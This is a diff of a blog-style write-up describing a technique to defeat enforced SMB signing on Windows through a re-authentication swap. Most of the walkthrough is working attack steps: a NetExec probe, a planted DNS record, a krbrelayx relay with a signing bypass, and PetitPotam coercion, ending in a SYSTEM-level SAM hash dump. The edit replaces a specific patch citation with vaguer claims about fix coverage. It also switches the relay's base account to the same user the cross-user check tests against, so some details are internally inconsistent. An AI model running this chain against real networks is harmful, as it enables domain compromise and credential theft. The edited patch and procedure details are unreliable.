@@ -72,10 +72,16 @@ Limits, so this is not over-read:
   already defines for binding). Enforced SMB signing stays necessary; it is just not sufficient on its
   own against this.
 
-Microsoft also appears to have quietly closed this in September. A same-user check on re-authentication appears in
-srv2.sys 10.0.26100.9444 (shipped in [KB5124008](https://support.microsoft.com/help/5124008),
-8 September 2026) and is absent before it. As of October 2026 there is no CVE attached and the KB lists
-none, so it reads as a quiet, unannounced fix.
+## A note on patching
+
+This looks like it is being fixed. A same-user check on re-authentication shows up on
+Windows 11 24H2 / Server 2025 around September 2026, and similar changes seem to have
+reached the other supported Windows versions, servers and workstations alike, in the
+weeks after. I have not traced every build, and one or two end-of-life versions may never
+receive it. So it is probably better read as a patch window than a permanent gap: a host
+that is current on updates is likely no longer affected, while hosts behind that wave
+still are. I could not find a CVE for this specific change, in Microsoft's update guide, the KB notes, or public
+trackers; it reads as silent hardening rather than a tracked fix. Corrections welcome.
 
 ## Tools
 
@@ -87,9 +93,10 @@ Two small things, for authorized testing only:
 - A NetExec module, `reauth_swap`, that checks whether a host still allows the cross-user
   re-authentication swap.
 
-A full run against a signing-required member server (not a DC), all values anonymized. Two low-privilege
-domain accounts the attacker controls: `user1` (writes the DNS record on the DC and triggers the
-coercion) and `user2` (the relay's base session). The target is `FS01` at `10.0.0.10`; the DC that holds
+What follows is an example. Two low-privilege
+domain accounts the attacker controls: `user1` does the real work (recon, the DNS record on the DC, the coercion, and the relay's base
+session); `user2` is only the second identity the step 1 viability check needs to test the cross-user
+swap. The target is `FS01` at `10.0.0.10`; the DC that holds
 the AD-integrated DNS zone is at `10.0.0.5`; the relay listens on `10.0.0.50`.
 
 **1. Recon** - the one precondition to confirm first is that the target **enforces SMB signing**
@@ -104,7 +111,8 @@ $ nxc smb 10.0.0.10 -u user1 -p Passw0rd1 -d AD.LOCAL -M reauth_swap -o PROBE_US
 
 SMB          10.0.0.10  445  FS01  [*] Windows Server 2022 Build 20348 x64 (name:FS01) (domain:ad.local) (signing:True)
 SMB          10.0.0.10  445  FS01  [+] ad.local\user1:Passw0rd1
-REAUTH_SWAP  10.0.0.10  445  FS01  VULNERABLE - enforced SMB signing is bypassable: server allows a cross-user re-auth swap (user1 -> user2)
+REAUTH_SWAP  10.0.0.10  445  FS01  VULNERABLE - enforced SMB signing bypassable
+REAUTH_SWAP  10.0.0.10  445  FS01  Next step: https://blackfield.ch/blog/defeating-enforced-smb-signing/
 ```
 
 ```
@@ -139,11 +147,11 @@ $ dig +noidnin +noidnout +short "$NAME.ad.local" @10.0.0.5
 10.0.0.50
 ```
 
-**3. Start the relay with the signing bypass** - the base session is `user2`, whose signing key you
+**3. Start the relay with the signing bypass** - the base session is `user1`, whose signing key you
 control. Leave it running.
 
 ```
-$ sudo python3 krbrelayx.py -t smb://10.0.0.10 --reauth-bypass 'AD.LOCAL/user2:Passw0rd2'
+$ sudo python3 krbrelayx.py -t smb://10.0.0.10 --reauth-bypass 'AD.LOCAL/user1:Passw0rd1'
 [*] Protocol Client SMB loaded..
 [*] Running in attack mode to single host
 [*] Setting up SMB Server
@@ -151,7 +159,7 @@ $ sudo python3 krbrelayx.py -t smb://10.0.0.10 --reauth-bypass 'AD.LOCAL/user2:P
 ```
 
 **4. Coerce the target** - it authenticates to the relay, which reflects it back onto FS01 while
-keeping `user2`'s signing key.
+keeping `user1`'s signing key.
 
 ```
 $ python3 PetitPotam.py -d AD.LOCAL -u user1 -p Passw0rd1 "$NAME" 10.0.0.10
@@ -165,7 +173,7 @@ The relay window then shows the swap and a SYSTEM-level dump:
 
 ```
 [*] SMBD: Received connection from 10.0.0.10
-[*] [reauth-bypass] base session user2 signingKey=6b5e6027d709724bf5298a3335173119
+[*] [reauth-bypass] base session user1 signingKey=6b5e6027d709724bf5298a3335173119
 [*] [reauth-bypass] reflected re-auth status=0x00000000
 [*] [reauth-bypass] SUCCESS - privileged session kept, signing with the low-priv key
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
